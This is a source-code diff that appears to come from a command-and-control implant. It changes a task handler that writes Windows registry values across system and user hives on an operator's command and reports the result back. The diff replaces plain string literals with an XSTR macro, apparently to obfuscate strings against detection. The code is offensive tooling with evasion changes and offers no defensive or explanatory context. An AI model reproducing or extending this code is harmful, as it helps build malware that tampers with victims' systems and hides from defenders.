@@ -11,15 +11,15 @@ using namespace stardust;
 using namespace starburst;
 
 static auto declfn parse_hive_rw( instance& inst, char* hive_str ) -> HKEY {
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
-         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKLM" ) ) == 0 ||
+         str_cmp( hive_str, XSTR( "HKEY_LOCAL_MACHINE" ) ) == 0 )
         return HKEY_LOCAL_MACHINE;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
-         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKCU" ) ) == 0 ||
+         str_cmp( hive_str, XSTR( "HKEY_CURRENT_USER" ) ) == 0 )
         return HKEY_CURRENT_USER;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKCR" ) ) == 0 )
         return HKEY_CLASSES_ROOT;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKU" ) ) == 0 )
         return HKEY_USERS;
     return nullptr;
 }
@@ -41,7 +41,7 @@ auto declfn starburst::cmd_reg_write_value(
 
     if ( !hive_str || !key_str || !name_str ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need hive, key, name, value" ) ) );
+            XSTR( "need hive, key, name, value" ) );
         return;
     }
 
@@ -58,7 +58,7 @@ auto declfn starburst::cmd_reg_write_value(
     HKEY hive = parse_hive_rw( inst, hive_buf );
     if ( !hive ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
+            XSTR( "invalid hive" ) );
         return;
     }
 
@@ -69,7 +69,7 @@ auto declfn starburst::cmd_reg_write_value(
         KEY_SET_VALUE, nullptr, &h_key, &disposition );
     if ( status != ERROR_SUCCESS ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "RegCreateKeyExA failed" ) ) );
+            XSTR( "RegCreateKeyExA failed" ) );
         return;
     }
 
@@ -94,10 +94,10 @@ auto declfn starburst::cmd_reg_write_value(
 
     if ( status == ERROR_SUCCESS ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "value written" ) ) );
+            XSTR( "value written" ) );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "RegSetValueExA failed" ) ) );
+            XSTR( "RegSetValueExA failed" ) );
     }
 }
 
